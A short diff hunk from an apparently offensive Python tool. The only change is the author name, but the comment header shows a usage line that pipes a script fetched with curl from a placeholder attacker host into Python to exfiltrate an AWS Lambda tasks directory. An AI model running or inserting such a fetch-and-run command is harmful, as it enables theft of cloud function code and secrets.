@@ -9,7 +9,7 @@
 #
 #   $ curl -s https://<ATTACKER>/exfiltrateLambdaTasksDirectory.py | python
 #
-# Author: Mariusz B., '19, <mb@binary-offensive.com>
+# Author: Mariusz Banach, '19, <mb@binary-offensive.com>
 #
 
 import zipfile, StringIO
